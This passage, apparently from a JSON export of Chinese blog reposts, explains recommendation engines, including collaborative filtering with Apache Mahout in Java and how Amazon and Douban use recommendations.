101L);  //<1L, 101L, 2.0f> \nuserPref.setValue(0, 2.0f); \nuserPref.setItemID(1, 102L);  //<1L, 102L, 4.0f> \nuserPref.setValue(1, 4.0f); \n \nPreference pref = userPref.get(1);   //<1L, 102L, 4.0f>\n```\n\n为了提高性能 Mahout 还构建了自己的 HashMap 和 Set：FastByIDMap 和 FastIDSet，有兴趣的朋友可以参考 Mahout 官方说明。\n\n**DataModel**\n\nMahout 的推荐引擎实际接受的输入是 DataModel，它是对用户偏好数据的压缩表示，通过创建内存版 DataModel 的语句我们可以看出：\n\nDataModel model = new GenericDataModel(FastByIDMap<PreferenceArray> map);\n\n他保存在一个按照用户 ID 或者物品 ID 进行散列的 PreferenceArray，而 PreferenceArray 中对应保存着这个用户 ID 或者物品 ID 的所有用户偏好信息。\n\nDataModel 是用户喜好信息的抽象接口，它的具体实现支持从任意类型的数据源抽取用户喜好信息，具体实现包括内存版的 GenericDataModel，支持文件读取的 FileDataModel 和支持数据库读取的 JDBCDataModel，下面我们看看如何创建各种 DataModel。\n\n##### 清单 2. 创建各种 DataModel\n\n```java\n//In-memory DataModel - GenericDataModel \n FastByIDMap<PreferenceArray> preferences = new FastByIDMap<PreferenceArray>(); \n \n PreferenceArray prefsForUser1 = new GenericUserPreferenceArray(10);  \n prefsForUser1.setUserID(0, 1L); \n prefsForUser1.setItemID(0, 101L); \n prefsForUser1.setValue(0, 3.0f);  \n prefsForUser1.setItemID(1, 102L); \n prefsForUser1.setValue(1, 4.5f); \n… (8 more) \n preferences.put(1L, prefsForUser1);   //use userID as the key \n… (more users) \n \n DataModel model = new GenericDataModel(preferences); \n \n //File-based DataModel - FileDataModel \n DataModel dataModel = new FileDataModel(new File(\"preferences.csv\"); \n \n //Database-based DataModel - MySQLJDBCDataModel \n MysqlDataSource dataSource = new MysqlDataSource(); \n dataSource.setServerName(\"my_user\"); \n dataSource.setUser(\"my_password\"); \n dataSource.setPassword(\"my_database_host\"); \n JDBCDataModel dataModel = new MySQLJDBCDataModel(dataSource, \"my_prefs_table\", \n \"my_user_column\", \"my_item_column\", \"my_pref_value_column\");\n```\n\n支持文件读取的 FileDataModel，Mahout 没有对文件的格式做过多的要求，只要文件的内容满足以下格式：\n\n- 每一行包括用户 ID, 物品 ID, 用户偏好\n- 逗号隔开或者 Tab 隔开\n- *.zip 和 *.gz 文件会自动解压缩（Mahout 建议在数据量过大时采用压缩的数据存储）\n\n支持数据库读取的 JDBCDataModel，Mahout 提供一个默认的 MySQL 的支持，它对用户偏好数据的存放有以下简单的要求：\n\n- 用户 ID 列需要是 BIGINT 而且非空\n- 物品 ID 列需要是 BIGINT 而且非空\n- 用户偏好列需要是 FLOAT\n\n建议在用户 ID 和物品 ID 上建索引。\n\n### 实现推荐：Recommender\n\n介绍完数据表示模型，下面介绍 Mahout 提供的协同过滤的推荐策略，这里我们选择其中最经典的三种，User CF, Item CF 和 Slope One。\n\n**User CF**\n\n前面已经详细介绍了 User CF 的原理，这里我们着重看怎么基于 Mahout 实现 User CF 的推荐策略，我们还是从一个例子入手：\n\n##### 清单 3. 基于 Mahout 实现 User CF\n\n```java\nDataModel model = new FileDataModel(new File(\"preferences.dat\")); \nUserSimilarity similarity = new PearsonCorrelationSimilarity(model); \nUserNeighborhood neighborhood = new NearestNUserNeighborhood(100, similarity, model); \nRecommender recommender = new GenericUserBasedRecommender(model, \nneighborhood, similarity);\n```\n\n1. 从文件建立 DataModel，我们采用前面介绍的 FileDataModel，这里假设用户的喜好信息存放在 preferences.dat 文件中。\n2. 基于用户偏好数据计算用户的相似度，清单中采用的是 PearsonCorrelationSimilarity，前面章节曾详细介绍了各种计算相似度的方法，Mahout 中提供了基本的相似度的计算，它们都 UserSimilarity 这个接口，实现用户相似度的计算，包括下面这些常用的：\n\n- PearsonCorrelationSimilarity：基于皮尔逊相关系数计算相似度\n- EuclideanDistanceSimilarity：基于欧几里德距离计算相似度\n- TanimotoCoefficientSimilarity：基于 Tanimoto 系数计算相似度\n- UncerteredCosineSimilarity：计算 Cosine 相似度\n\nItemSimilarity 也是类似的：\n\n1. 根据建立的相似度计算方法，找到邻居用户。这里找邻居用户的方法根据前面我们介绍的，也包括两种：“固定数量的邻居”和“相似度门槛邻居”计算方法，Mahout 提供对应的实现：\n   - NearestNUserNeighborhood：对每个用户取固定数量 N 的最近邻居\n   - ThresholdUserNeighborhood：对每个用户基于一定的限制，取落在相似度门限内的所有用户为邻居。\n2. 基于 DataModel，UserNeighborhood 和 UserSimilarity 构建 GenericUserBasedRecommender，实现 User CF 推荐策略。\n\n**Item CF**\n\n了解了 User CF，Mahout Item CF 的实现与 User CF 类似，是基于 ItemSimilarity，下面我们看实现的代码例子，它比 User CF 更简单，因为 Item CF 中并不需要引入邻居的概念：\n\n##### 清单 4. 基于 Mahout 实现 Item CF\n\n```\n`DataModel model = new FileDataModel(new File(\"preferences.dat\")); ``ItemSimilarity similarity = new PearsonCorrelationSimilarity(model); ``Recommender recommender = new GenericItemBasedRecommender(model, similarity);`\n```\n\n**Slope One**\n\n如前面介绍的，User CF 和 Item CF 是最常用最容易理解的两种 CF 的推荐策略，但在大数据量时，它们的计算量会很大，从而导致推荐效率较差。因此 Mahout 还提供了一种更加轻量级的 CF 推荐策略：Slope One。\n\nSlope One 是有 Daniel Lemire 和 Anna Maclachlan 在 2005 年提出的一种对基于评分的协同过滤推荐引擎的改进方法，下面简单介绍一下它的基本思想。\n\n图 5 给出了例子，假设系统对于物品 A，物品 B 和物品 C 的平均评分分别是 3，4 和 4。基于 Slope One 的方法会得到以下规律：\n\n- 用户对物品 B 的评分 = 用户对物品 A 的评分 + 1\n- 用户对物品 B 的评分 = 用户对物品 C 的评分\n\n基于以上的规律，我们可以对用户 A 和用户 B 的打分进行预测：\n\n- 对用户 A，他给物品 A 打分 4，那么我们可以推测他对物品 B 的评分是 5，对物品 C 的打分也是 5。\n- 对用户 B，他给物品 A 打分 2，给物品 C 打分 4，根据第一条规律，我们可以推断他对物品 B 的评分是 3；而根据第二条规律，推断出评分是 4。当出现冲突时，我们可以对各种规则得到的推断进行就平均，所以给出的推断是 3.5。\n\n这就是 Slope One 推荐的基本原理，它将用户的评分之间的关系看作简单的线性关系：\n\nY = mX + b;\n\n当 m = 1 时就是 Slope One，也就是我们刚刚展示的例子。\n\n##### 图 5.Slope One 推荐策略示例\n\n![](https://ws1.sinaimg.cn/large/006tNbRwly1fxev425is5g309i081aa6.gif)\n\nSlope One 的核心优势是在大规模的数据上，它依然能保证良好的计算速度和推荐效果。Mahout 提供了 Slope One 推荐方法的基本实现，实现代码很简单，参考清单 5.\n\n##### 清单 5. 基于 Mahout 实现 Slope One\n\n```java\n//In-Memory Recommender \nDiffStorage diffStorage = new MemoryDiffStorage(model, Weighting.UNWEIGHTED, false, \nLong.MAX_VALUE)); \nRecommender recommender = new SlopeOneRecommender(model, Weighting.UNWEIGHTED, \nWeighting.UNWEIGHTED, diffStorage);  \n \n//Database-based Recommender \nAbstractJDBCDataModel model = new MySQLJDBCDataModel(); \nDiffStorage diffStorage = new MySQLJDBCDiffStorage(model); \nRecommender recommender = new SlopeOneRecommender(model, Weighting.WEIGHTED, \nWeighting.WEIGHTED, diffStorage);\n```\n\n1. 根据 Data Model 创建数据之间线性关系的模型 DiffStorage。\n\n2. 基于 Data Model 和 DiffStorage 创建 SlopeOneRecommender，实现 Slope One 推荐策略。\n\n## 总结\n\nWeb2.0 的一个核心思想就是“集体智慧”，基于协同过滤的推荐策略的基本思想就是基于大众行为，为每个用户提供个性化的推荐，从而使用户能更快速更准确的发现所需要的信息。从应用角度分析，现今比较成功的推荐引擎，比如 Amazon，豆瓣，当当等都采用了协同过滤的方式，它不需要对物品或者用户进行严格的建模，而且不要求物品的描述是机器可理解的，是中领域无关的推荐方法，同时这个方法计算出来的推荐是开放的，可以共用他人的经验，很好的支持用户发现潜在的兴趣偏好。基于协同过滤的推荐策略也有不同的分支，它们有不同的实用场景和推荐效果，用户可以根据自己应用的实际情况选择合适的方法，异或组合不同的方法得到更好的推荐效果。\n\n除此之外，本文还介绍了如何基于 Apache Mahout 高效实现协同过滤推荐算法，Apache Mahout 关注海量数据上的机器学习经典算法的高效实现，其中对基于协同过滤的推荐方法也提供了很好的支持，基于 Mahout 你可以轻松的体验高效推荐的神奇。\n\n作为深入推荐引擎相关算法的第一篇文章，本文深入介绍了协同过滤算法，并举例介绍了如何基于 Apache Mahout 高效实现协同过滤推荐算法，Apache Mahout 作为海量数据上的机器学习经典算法的高效实现，其中对基于协同过滤的推荐方法也提供了很好的支持，基于 Mahout 你可以轻松的体验高效推荐的神奇。但我们也发现了在海量数据上高效的运行协同过滤算法以及其他推荐策略这样高复杂的算法还是有很大的挑战的。在面对这个问题的过程中，大家提出了很多减少计算量的方法，而聚类无疑是其中最优的选择。所以本系列的下一篇文章将详细介绍各类聚类算法，它们的原理，优缺点和实用场景，并给出基于 Apache Mahout 的聚类算法的高效实现，并分析在推荐引擎的实现中，如何通过引入聚类来解决大数据量造成的海量计算，从而提供高效的推荐。\n\n最后，感谢大家对本系列的关注和支持。\n",
			"tags":"协同过滤,个性化推荐",
			"id":"84310535",
			"categories":"java",
			"status":1
		},
		"error":"",
		"status":true
	},
	{
		"data":{
			"date":"2018年11月20日 21:39:02",
			"articleedittype":1,
			"private":0,
			"channel":"2",
			"description":"\n内容转载自: 推荐引擎初探\n\n“探索推荐引擎内部的秘密”系列将带领读者从浅入深的学习探索推荐引擎的机制，实现方法，其中还涉及一些基本的优化方法，例如聚类和分类的应用。同时在理论讲解的基础上，还会结合 Apache Mahout 介绍如何在大规模数据上实现各种推荐策略，进行策略优化，构建高效的推荐引擎的方法。本文作为这个系列的第一篇文章，将深入介绍推荐引擎的工作原理，和其中涉及的各种推荐机制，以及...",
			"title":"推荐引擎初探",
			"type":"repost",
			"content":"<blockquote>\n<p>内容转载自: <a href=\"https://www.ibm.com/developerworks/cn/web/1103_zhaoct_recommstudy1/index.html?ca=drs-\">推荐引擎初探</a></p>\n</blockquote>\n<p>“探索推荐引擎内部的秘密”系列将带领读者从浅入深的学习探索推荐引擎的机制，实现方法，其中还涉及一些基本的优化方法，例如聚类和分类的应用。同时在理论讲解的基础上，还会结合 Apache Mahout 介绍如何在大规模数据上实现各种推荐策略，进行策略优化，构建高效的推荐引擎的方法。本文作为这个系列的第一篇文章，将深入介绍推荐引擎的工作原理，和其中涉及的各种推荐机制，以及它们各自的优缺点和适用场景，帮助用户清楚的了解和快速构建适合自己的推荐引擎。</p>\n<h2><a id=\"_4\"></a>信息发现</h2>\n<p>如今已经进入了一个数据爆炸的时代，随着 Web 2.0 的发展， Web 已经变成数据分享的平台，那么，如何让人们在海量的数据中想要找到他们需要的信息将变得越来越难。</p>\n<p>在这样的情形下，搜索引擎（Google，Bing，百度等等）成为大家快速找到目标信息的最好途径。在用户对自己需求相对明确的时候，用搜索引擎很方便的通过关键字搜索很快的找到自己需要的信息。但搜索引擎并不能完全满足用户对信息发现的需求，那是因为在很多情况下，用户其实并不明确自己的需要，或者他们的需求很难用简单的关键字来表述。又或者他们需要更加符合他们个人口味和喜好的结果，因此出现了推荐系统，与搜索引擎对应，大家也习惯称它为推荐引擎。</p>\n<p>随着推荐引擎的出现，用户获取信息的方式从简单的目标明确的数据的搜索转换到更高级更符合人们使用习惯的信息发现。</p>\n<p>如今，随着推荐技术的不断发展，推荐引擎已经在电子商务 (E-commerce，例如 Amazon，当当网 ) 和一些基于 social 的社会化站点 ( 包括音乐，电影和图书分享，例如豆瓣，Mtime 等 ) 都取得很大的成功。这也进一步的说明了，Web2.0 环境下，在面对海量的数据，用户需要这种更加智能的，更加了解他们需求，口味和喜好的信息发现机制。</p>\n<h2><a id=\"_14\"></a>推荐引擎</h2>\n<p>前面介绍了推荐引擎对于现在的 Web2.0 站点的重要意义，这一章我们将讲讲推荐引擎到底是怎么工作的。推荐引擎利用特殊的信息过滤技术，将不同的物品或内容推荐给可能对它们感兴趣的用户。</p>\n<h5><a id=\"_1__18\"></a>图 1. 推荐引擎工作原理图</h5>\n<p><img src=\"https://ws2.sinaimg.cn/large/006tNbRwly1fxeupzmnq5j30b7088wet.jpg\" alt=\"\"></p>\n<p>图 1 给出了推荐引擎的工作原理图，这里先将推荐引擎看作黑盒，它接受的输入是推荐的数据源，一般情况下，推荐引擎所需要的数据源包括：</p>\n<ul>\n<li>\n<p>要推荐物品或内容的元数据，例如关键字，基因描述等；</p>\n</li>\n<li>\n<p>系统用户的基本信息，例如性别，年龄等</p>\n</li>\n<li>\n<p>用户对物品或者信息的偏好，根据应用本身的不同，可能包括用户对物品的评分，用户查看物品的记录，用户的购买记录等。其实这些用户的偏好信息可以分为两类：</p>\n</li>\n<li>\n<p>显式的用户反馈：这类是用户在网站上自然浏览或者使用网站以外，显式的提供反馈信息，例如用户对物品的评分，或者对物品的评论。</p>\n</li>\n<li>\n<p>隐式的用户反馈：这类是用户在使用网站是产生的数据，隐式的反应了用户对物品的喜好，例如用户购买了某物品，用户查看了某物品的信息等等。</p>\n</li>\n</ul>\n<p>显式的用户反馈能准确的反应用户对物品的真实喜好，但需要用户付出额外的代价，而隐式的用户行为，通过一些分析和处理，也能反映用户的喜好，只是数据不是很精确，有些行为的分析存在较大的噪音。但只要选择正确的行为特征，隐式的用户反馈也能得到很好的效果，只是行为特征的选择可能在不同的应用中有很大的不同，例如在电子商务的网站上，购买行为其实就是一个能很好表现用户喜好的隐式反馈。</p>\n<p>推荐引擎根据不同的推荐机制可能用到数据源中的一部分，然后根据这些数据，分析出一定的规则或者直接对用户对其他物品的喜好进行预测计算。这样推荐引擎可以在用户进入的时候给他推荐他可能感兴趣的物品。</p>\n<h2><a id=\"_35\"></a>推荐引擎的分类</h2>\n<p>推荐引擎的分类可以根据很多指标，下面我们一一介绍一下：</p>\n<ol>\n<li>\n<p>推荐引擎是不是为不同的用户推荐不同的数据</p>\n<p>根据这个指标，推荐引擎可以分为基于大众行为的推荐引擎和个性化推荐引擎</p>\n<ul>\n<li>根据大众行为的推荐引擎，对每个用户都给出同样的推荐，这些推荐可以是静态的由系统管理员人工设定的，或者基于系统所有用户的反馈统计计算出的当下比较流行的物品。</li>\n<li>个性化推荐引擎，对不同的用户，根据他们的口味和喜好给出更加精确的推荐，这时，系统需要了解需推荐内容和用户的特质，或者基于社会化网络，通过找到与当前用户相同喜好的用户，实现推荐。</li>\n</ul>\n<p>这是一个最基本的推荐引擎分类，其实大部分人们讨论的推荐引擎都是将个性化的推荐引擎，因为从根本上说，只有个性化的推荐引擎才是更加智能的信息发现过程。</p>\n</li>\n<li>\n<p>根据推荐引擎的数据源</p>\n<p>其实这里讲的是如何发现数据的相关性，因为大部分推荐引擎的工作原理还是基于物品或者用户的相似集进行推荐。那么参考图 1 给出的推荐系统原理图，根据不同的数据源发现数据相关性的方法可以分为以下几种：</p>\n<ul>\n<li>根据系统用户的基本信息发现用户的相关程度，这种被称为基于人口统计学的推荐（Demographic-based Recommendation）</li>\n<li>根据推荐物品或内容的元数据，发现物品或者内容的相关性，这种被称为基于内容的推荐（Content-based Recommendation）</li>\n<li>根据用户对物品或者信息的偏好，发现物品或者内容本身的相关性，或者是发现用户的相关性，这种被称为基于协同过滤的推荐（Collaborative Filtering-based Recommendation）。</li>\n</ul>\n</li>\n<li>\n<p>根据推荐模型的建立方式</p>\n<p>可以想象在海量物品和用户的系统中，推荐引擎的计算量是相当大的，要实现实时的推荐务必需要建立一个推荐模型，关于推荐模型的建立方式可以分为以下几种：</p>\n<ul>\n<li>基于物品和用户本身的，这种推荐引擎将每个用户和每个物品都当作独立的实体，预测每个用户对于每个物品的喜好程度，这些信息往往是用一个二维矩阵描述的。由于用户感兴趣的物品远远小于总物品的数目，这样的模型导致大量的数据空置，即我们得到的二维矩阵往往是一个很大的稀疏矩阵。同时为了减小计算量，我们可以对物品和用户进行聚类， 然后记录和计算一类用户对一类物品的喜好程度，但这样的模型又会在推荐的准确性上有损失。</li>\n<li>基于关联规则的推荐（Rule-based Recommendation）：关联规则的挖掘已经是数据挖掘中的一个经典的问题，主要是挖掘一些数据的依赖关系，典型的场景就是“购物篮问题”，通过关联规则的挖掘，我们可以找到哪些物品经常被同时购买，或者用户购买了一些物品后通常会购买哪些其他的物品，当我们挖掘出这些关联规则之后，我们可以基于这些规则给用户进行推荐。</li>\n<li>基于模型的推荐（Model-based Recommendation）：这是一个典型的机器学习的问题，可以将已有的用户喜好信息作为训练样本，训练出一个预测用户喜好的模型，这样以后用户在进入系统，可以基于此模型计算推荐。这种方法的问题在于如何将用户实时或者近期的喜好信息反馈给训练好的模型，从而提高推荐的准确度。</li>\n</ul>\n</li>\n</ol>\n<p>其实在现在的推荐系统中，很少有只使用了一个推荐策略的推荐引擎，一般都是在不同的场景下使用不同的推荐策略从而达到最好的推荐效果，例如 Amazon 的推荐，它将基于用户本身历史购买数据的推荐，和基于用户当前浏览的物品的推荐，以及基于大众喜好的当下比较流行的物品都在不同的区域推荐给用户，让用户可以从全方位的推荐中找到自己真正感兴趣的物品。</p>\n<h2><a id=\"_66\"></a>深入推荐机制</h2>\n<p>这一章的篇幅，将详细介绍各个推荐机制的工作原理，它们的优缺点以及应用场景。</p>\n<h3><a id=\"_70\"></a>基于人口统计学的推荐</h3>\n<p>基于人口统计学的推荐机制（Demographic-based Recommendation）是一种最易于实现的推荐方法，它只是简单的根据系统用户的基本信息发现用户的相关程度，然后将相似用户喜爱的其他物品推荐给当前用户，图 2 给出了这种推荐的工作原理。</p>\n<h5><a id=\"_2__74\"></a>图 2. 基于人口统计学的推荐机制的工作原理</h5>\n<p><img src=\"https://ws1.sinaimg.cn/large/006tNbRwly1fxeuqjca50j309r05x74m.jpg\" alt=\"\"></p>\n<p>从图中可以很清楚的看到，首先，系统对每个用户都有一个用户 Profile 的建模，其中包括用户的基本信息，例如用户的年龄，性别等等；然后，系统会根据用户的 Profile 计算用户的相似度，可以看到用户 A 的 Profile 和用户 C 一样，那么系统会认为用户 A 和 C 是相似用户，在推荐引擎中，可以称他们是“邻居”；最后，基于“邻居”用户群的喜好推荐给当前用户一些物品，图中将用户 A 喜欢的物品 A 推荐给用户 C。</p>\n<p>这种基于人口统计学的推荐机制的好处在于：</p>\n<ol>\n<li>因为不使用当前用户对物品的喜好历史数据，所以对于新用户来讲没有“冷启动（Cold Start）”的问题。</li>\n<li>这个方法不依赖于物品本身的数据，所以这个方法在不同物品的领域都可以使用，它是领域独立的（domain-independent）。</li>\n</ol>\n<p>那么这个方法的缺点和问题是什么呢？这种基于用户的基本信息对用户进行分类的方法过于粗糙，尤其是对品味要求较高的领域，比如图书，电影和音乐等领域，无法得到很好的推荐效果。可能在一些电子商务的网站中，这个方法可以给出一些简单的推荐。另外一个局限是，这个方法可能涉及到一些与信息发现问题本身无关却比较敏感的信息，比如用户的年龄等，这些用户信息不是很好获取。</p>\n<h3><a id=\"_87\"></a>基于内容的推荐</h3>\n<p>基于内容的推荐是在推荐引擎出现之初应用最为广泛的推荐机制，它的核心思想是根据推荐物品或内容的元数据，发现物品或者内容的相关性，然后基于用户以往的喜好记录，推荐给用户相似的物品。图 3 给出了基于内容推荐的基本原理。</p>\n<h5><a id=\"_3__91\"></a>图 3. 基于内容推荐机制的基本原理</h5>\n<p><img src=\"https://ws4.sinaimg.cn/large/006tNbRwly1fxeuqv882aj309x064q2z.jpg\" alt=\"\"></p>\n<p>图 3 中给出了基于内容推荐的一个典型的例子，电影推荐系统，首先我们需要对电影的元数据有一个建模，这里只简单的描述了一下电影的类型；然后通过电影的元数据发现电影间的相似度，因为类型都是“爱情，浪漫”电影 A 和 C 被认为是相似的电影（当然，只根据类型是不够的，要得到更好的推荐，我们还可以考虑电影的导演，演员等等）；最后实现推荐，对于用户 A，他喜欢看电影 A，那么系统就可以给他推荐类似的电影 C。</p>\n<p>这种基于内容的推荐机制的好处在于它能很好的建模用户的口味，能提供更加精确的推荐。但它也存在以下几个问题：</p>\n<ol>\n<li>需要对物品进行分析和建模，推荐的质量依赖于对物品模型的完整和全面程度。在现在的应用中我们可以观察到关键词和标签（Tag）被认为是描述物品元数据的一种简单有效的方法。</li>\n<li>物品相似度的分析仅仅依赖于物品本身的特征，这里没有考虑人对物品的态度。</li>\n<li>因为需要基于用户以往的喜好历史做出推荐，所以对于新用户有“冷启动”的问题。</li>\n</ol>\n<p>虽然这个方法有很多不足和问题，但他还是成功的应用在一些电影，音乐，图书的社交站点，有些站点还请专业的人员对物品进行基因编码，比如潘多拉，在一份报告中说道，在潘多拉的推荐引擎中，每首歌有超过 100 个元数据特征，包括歌曲的风格，年份，演唱者等等。</p>\n<h3><a id=\"_105\"></a>基于协同过滤的推荐</h3>\n<p>随着 Web2.0 的发展，Web 站点更加提倡用户参与和用户贡献，因此基于协同过滤的推荐机制因运而生。它的原理很简单，就是根据用户对物品或者信息的偏好，发现物品或者内容本身的相关性，或者是发现用户的相关性，然后再基于这些关联性进行推荐。基于协同过滤的推荐可以分为三个子类：基于用户的推荐（User-based Recommendation），基于项目的推荐（Item-based Recommendation）和基于模型的推荐（Model-based Recommendation）。下面我们一个一个详细的介绍着三种协同过滤的推荐机制。</p>\n<p><strong>基于用户的协同过滤推荐</strong></p>\n<p>基于用户的协同过滤推荐的基本原理是，根据所有用户对物品或者信息的偏好，发现与当前用户口味和偏好相似的“邻居”用户群，在一般的应用中是采用计算“K- 邻居”的算法；然后，基于这 K 个邻居的历史偏好信息，为当前用户进行推荐。下图 4 给出了原理图。</p>\n<h5><a id=\"_4__113\"></a>图 4. 基于用户的协同过滤推荐机制的基本原理</h5>\n<p><img src=\"https://ws3.sinaimg.cn/large/006tNbRwly1fxeur7z2kij307z05u749.jpg\" alt=\"\"></p>\n<p>上图示意出基于用户的协同过滤推荐机制的基本原理，假设用户 A 喜欢物品 A，物品 C，用户 B 喜欢物品 B，用户 C 喜欢物品 A ，物品 C 和物品 D；从这些用户的历史喜好信息中，我们可以发现用户 A 和用户 C 的口味和偏好是比较类似的，同时用户 C 还喜欢物品 D，那么我们可以推断用户 A 可能也喜欢物品 D，因此可以将物品 D 推荐给用户 A。</p>\n<p>基于用户的协同过滤推荐机制和基于人口统计学的推荐机制都是计算用户的相似度，并基于“邻居”用户群计算推荐，但它们所不同的是如何计算用户的相似度，基于人口统计学的机制只考虑用户本身的特征，而基于用户的协同过滤机制可是在用户的历史偏好的数据上计算用户的相似度，它的基本假设是，喜欢类似物品的用户可能有相同或者相似的口味和偏好。</p>\n<p><strong>基于项目的协同过滤推荐</strong></p>\n<p>基于项目的协同过滤推荐的基本原理也是类似的，只是说它使用所有用户对物品或者信息的偏好，发现物品和物品之间的相似度，然后根据用户的历史偏好信息，将类似的物品推荐给用户，图 5 很好的诠释了它的基本原理。</p>\n<p>假设用户 A 喜欢物品 A 和物品 C，用户 B 喜欢物品 A，物品 B 和物品 C，用户 C 喜欢物品 A，从这些用户的历史喜好可以分析出物品 A 和物品 C 时比较类似的，喜欢物品 A 的人都喜欢物品 C，基于这个数据可以推断用户 C 很有可能也喜欢物品 C，所以系统会将物品 C 推荐给用户 C。</p>\n<p>与上面讲的类似，基于项目的协同过滤推荐和基于内容的推荐其实都是基于物品相似度预测推荐，只是相似度计算的方法不一样，前者是从用户历史的偏好推断，而后者是基于物品本身的属性特征信息。</p>\n<h5><a id=\"_5__129\"></a>图 5. 基于项目的协同过滤推荐机制的基本原理</h5>\n<p><img src=\"https://ws3.sinaimg.cn/large/006tNbRwly1fxeurim8t1j308d05xjrc.jpg\" alt=\"\"></p>\n<p>同时协同过滤，在基于用户和基于项目两个策略中应该如何选择呢？其实基于项目的协同过滤推荐机制是 Amazon 在基于用户的机制上改良的一种策略，因为在大部分的 Web 站点中，物品的个数是远远小于用户的数量的，而且物品的个数和相似度相对比较稳定，同时基于项目的机制比基于用户的实时性更好一些。但也不是所有的场景都是这样的情况，可以设想一下在一些新闻推荐系统中，也许物品，也就是新闻的个数可能大于用户的个数，而且新闻的更新程度也有很快，所以它的形似度依然不稳定。所以，其实可以看出，推荐策略的选择其实和具体的应用场景有很大的关系。</p>\n<p><strong>基于模型的协同过滤推荐</strong></p>\n<p>基于模型的协同过滤推荐就是基于样本的用户喜好信息，训练一个推荐模型，然后根据实时的用户喜好的信息进行预测，计算推荐。</p>\n<p>基于协同过滤的推荐机制是现今应用最为广泛的推荐机制，它有以下几个显著的优点：</p>\n<ol>\n<li>它不需要对物品或者用户进行严格的建模，而且不要求物品的描述是机器可理解的，所以这种方法也是领域无关的。</li>\n<li>这种方法计算出来的推荐是开放的，可以共用他人的经验，很好的支持用户发现潜在的兴趣偏好</li>\n</ol>\n<p>而它也存在以下几个问题：</p>\n<ol>\n<li>方法的核心是基于历史数据，所以对新物品和新用户都有“冷启动”的问题。</li>\n<li>推荐的效果依赖于用户历史偏好数据的多少和准确性。</li>\n<li>在大部分的实现中，用户历史偏好是用稀疏矩阵进行存储的，而稀疏矩阵上的计算有些明显的问题，包括可能少部分人的错误偏好会对推荐的准确度有很大的影响等等。</li>\n<li>对于一些特殊品味的用户不能给予很好的推荐。</li>\n<li>由于以历史数据为基础，抓取和建模用户的偏好后，很难修改或者根据用户的使用演变，从而导致这个方法不够灵活。</li>\n</ol>\n<h3><a id=\"_152\"></a>混合的推荐机制</h3>\n<p>在现行的 Web 站点上的推荐往往都不是单纯只采用了某一种推荐的机制和策略，他们往往是将多个方法混合在一起，从而达到更好的推荐效果。关于如何组合各个推荐机制，这里讲几种比较流行的组合方法。</p>\n<ol>\n<li>加权的混合（Weighted Hybridization）: 用线性公式（linear formula）将几种不同的推荐按照一定权重组合起来，具体权重的值需要在测试数据集上反复实验，从而达到最好的推荐效果。</li>\n<li>切换的混合（Switching Hybridization）：前面也讲到，其实对于不同的情况（数据量，系统运行状况，用户和物品的数目等），推荐策略可能有很大的不同，那么切换的混合方式，就是允许在不同的情况下，选择最为合适的推荐机制计算推荐。</li>\n<li>分区的混合（Mixed Hybridization）：采用多种推荐机制，并将不同的推荐结果分不同的区显示给用户。其实，Amazon，当当网等很多电子商务网站都是采用这样的方式，用户可以得到很全面的推荐，也更容易找到他们想要的东西。</li>\n<li>分层的混合（Meta-Level Hybridization）: 采用多种推荐机制，并将一个推荐机制的结果作为另一个的输入，从而综合各个推荐机制的优缺点，得到更加准确的推荐。</li>\n</ol>\n<h2><a id=\"_161\"></a>推荐引擎的应用</h2>\n<p>介绍完推荐引擎的基本原理，基本推荐机制，下面简要分析几个有代表性的推荐引擎的应用，这里选择两个领域：Amazon 作为电子商务的代表，豆瓣作为社交网络的代表。</p>\n<p><strong>推荐在电子商务中的应用 – Amazon</strong></p>\n<p>Amazon 作为推荐引擎的鼻祖，它已经将推荐的思想渗透在应用的各个角落。Amazon 推荐的核心是通过数据挖掘算法和比较用户的消费偏好于其他用户进行对比，借以预测用户可能感兴趣的商品。对应于上面介绍的各种推荐机制，Amazon 采用的是分区的混合的机制，并将不同的推荐结果分不同的区显示给用户，图 6 和图 7 展示了用户在 Amazon 上能得到的推荐。</p>\n<h5><a id=\"_6_Amazon____169\"></a>图 6. Amazon 的推荐机制 - 首页</h5>\n<p><img src=\"https://ws3.sinaimg.cn/large/006tNbRwly1fxeurryh2ag30e7095js5.gif\" alt=\"\"></p>\n<h5><a id=\"_7_Amazon____173\"></a>图 7. Amazon 的推荐机制 - 浏览物品</h5>\n<p><img src=\"https://ws2.sinaimg.cn/large/006tNbRwly1fxeurwn1iig30d709f0tf.gif\" alt=\"\"></p>\n<p>Amazon 利用可以记录的所有用户在站点上的行为，根据不同数据的特点对它们进行处理，并分成不同区为用户推送推荐：</p>\n<ul>\n<li>今日推荐 (Today’s Recommendation For You): 通常是根据用户的近期的历史购买或者查看记录，并结合时下流行的物品给出一个折中的推荐。</li>\n<li>新产品的推荐 (New For You): 采用了基于内容的推荐机制 (Content-based Recommendation)，将一些新到物品推荐给用户。在方法选择上由于新物品没有大量的用户喜好信息，所以基于内容的推荐能很好的解决这个“冷启动”的问题。</li>\n<li>捆绑销售 (Frequently Bought Together): 采用数据挖掘技术对用户的购买行为进行分析，找到经常被一起或同一个人购买的物品集，进行捆绑销售，这是一种典型的基于项目的协同过滤推荐机制。</li>\n<li>别人购买 / 浏览的商品 (Customers Who Bought/See This Item Also Bought/See): 这也是一个典型的基于项目的协同过滤推荐的应用，通过社会化机制用户能更快更方便的找到自己感兴趣的物品。</li>\n</ul>\n<p>值得一提的是，Amazon 在做推荐时，设计和用户体验也做得特别独到：</p>\n<p>Amazon 利用有它大量历史数据的优势，量化推荐原因。</p>\n<ul>\n<li>基于社会化的推荐，Amazon 会给你事实的数据，让用户信服，例如：购买此物品的用户百分之多少也购买了那个物品；</li>\n<li>基于物品本身的推荐，Amazon 也会列出推荐的理由，例如：因为你的购物框中有 ***，或者因为你购买过 ***，所以给你推荐类似的 ***。</li>\n</ul>\n<p>另外，Amazon 很多推荐是基于用户的 profile 计算出来的，用户的 profile 中记录了用户在 Amazon 上的行为，包括看了那些物品，买了那些物品，收藏夹和 wish list 里的物品等等，当然 Amazon 里还集成了评分等其他的用户反馈的方式，它们都是 profile 的一部分，同时，Amazon 提供了让用户自主管理自己 profile 的功能，通过这种方式用户可以更明确的告诉推荐引擎他的品味和意图是什么。</p>\n<p><strong>推荐在社交网站中的应用 – 豆瓣</strong></p>\n<p>豆瓣是国内做的比较成功的社交网站，它以图书，电影，音乐和同城活动为中心，形成一个多元化的社交网络平台，自然推荐的功能是必不可少的，下面我们看看豆瓣是如何推荐的。</p>\n<h5><a id=\"_8_____197\"></a>图 8 . 豆瓣的推荐机制 - 豆瓣电影</h5>\n<p><img src=\"https://ws3.sinaimg.cn/large/006tNbRwly1fxeus35ywbg309c077mxh.gif\" 